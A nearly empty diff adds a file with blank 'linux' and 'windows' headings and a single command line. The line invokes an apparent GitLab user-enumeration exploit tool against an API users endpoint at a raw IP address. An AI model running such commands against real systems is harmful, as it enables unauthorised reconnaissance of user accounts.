@@ -1,0 +1,13 @@
+
+# linux
+
+# windows
+
+gitlab-api-user-enum-exploit.exe run --api-url https://202.191.66.163/api/v4/users/130 --output-by-domain
+
+
+
+
+
+
+
